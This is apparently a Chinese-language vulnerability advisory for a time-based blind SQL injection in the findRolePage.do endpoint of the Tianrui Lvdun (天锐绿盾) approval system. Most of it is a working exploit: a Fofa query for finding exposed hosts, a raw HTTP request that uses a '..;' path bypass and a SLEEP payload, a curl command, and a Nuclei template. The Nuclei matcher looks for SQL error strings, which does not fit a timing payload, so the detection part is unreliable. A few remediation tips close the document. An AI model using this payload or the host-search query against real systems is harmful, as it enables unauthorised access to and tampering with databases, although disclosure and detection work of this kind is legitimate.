# 天锐绿盾审批系统 findRolePage.do SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 天锐绿盾审批系统 findRolePage.do SQL注入漏洞 |
| 漏洞类型 | SQL注入（时间盲注） |
| 组件名称 | 天锐绿盾审批系统 |
| 影响版本 | 天锐绿盾审批系统 |
| 漏洞日期 | 2026-03-29 |

## 漏洞概述

天锐绿盾审批系统的 findRolePage.do 接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL查询参数，直接操控数据库查询语句，从而绕过身份验证，获取未授权的数据、修改数据库内容或执行其他恶意操作。该漏洞可能导致敏感信息泄露，例如用户数据或系统配置信息，严重影响系统的数据完整性和机密性。

## Fofa查询语法

```
app="TIPPAY-绿盾审批系统"
```

## 漏洞复现

### POC

```http
POST /trwfe/login.jsp/..;/role/findRolePage.do HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

sort=id OR (SELECT 5244 FROM (SELECT(SLEEP(4)))HAjH)&order=asc
```

### 特征

- 请求路径：`/trwfe/login.jsp/..;/role/findRolePage.do`
- 请求方法：POST
- 参数：`sort`、`order`
- 利用方式：时间盲注（SLEEP(4)）
- 响应延迟：4秒

### 验证命令

```bash
# 时间盲注测试（延迟4秒）
curl -X POST "http://TARGET/trwfe/login.jsp/..;/role/findRolePage.do" \
  -d "sort=id OR (SELECT 5244 FROM (SELECT(SLEEP(4)))HAjH)&order=asc"
```

## Nuclei 检测脚本

```yaml
id: tianrui-lvduan-findrolepage-sql

info:
  name: Tianrui Lvduan findRolePage.do SQL Injection
  author: 实战安全研究
  severity: high
  description: 天锐绿盾审批系统 findRolePage.do 接口存在SQL注入漏洞
  reference:
    - https://blog.wuyaoxuexi.cn
  tags: tianrui,lvduan,sql-injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/trwfe/login.jsp/..;/role/findRolePage.do"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      sort=id OR (SELECT 5244 FROM (SELECT(SLEEP(4)))HAjH)&order=asc
    matchers:
      - type: word
        words:
          - "java.sql"
          - "SQLException"
          - "com.microsoft.sqlserver"
        part: body
        case-insensitive: true
```

## 漏洞修复建议

1. 建议联系厂商打补丁或升级版本。
2. 增加Web应用防火墙防护。
3. 关闭互联网暴露面或接口设置访问权限。
